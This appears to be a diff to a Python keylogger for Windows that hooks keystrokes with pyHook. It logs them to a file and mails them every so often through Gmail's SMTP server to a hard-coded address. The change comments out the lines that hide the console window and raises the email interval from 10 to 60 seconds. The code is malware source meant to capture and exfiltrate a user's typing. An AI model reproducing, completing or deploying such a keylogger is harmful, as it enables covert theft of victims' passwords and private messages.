@@ -8,8 +8,8 @@ import pyHook
 
 
 # hides the keylogger
-foreground_window = win32gui.GetForegroundWindow()
-win32gui.ShowWindow(foreground_window, win32con.SW_HIDE)
+#foreground_window = win32gui.GetForegroundWindow()
+#win32gui.ShowWindow(foreground_window, win32con.SW_HIDE)
 
 GMAIL_SERVER = 'smtp.gmail.com:587'
 PROJECT_MAIL_ADDRESS = 'danacohentalbaum@gmail.com'
@@ -19,7 +19,7 @@ LOGGER_FILENAME = 'input.txt'
 LOGGER_FORMAT = '%(message)s'
 LOGGER_LEVEL = logger.INFO
 LOGGER_LEVEL_NUMBER = 20
-TIME_BETWEEN_EACH_EMAIL_MSG = 10
+TIME_BETWEEN_EACH_EMAIL_MSG = 60
 
 
 def OnKeyboardEvent(typed_char):
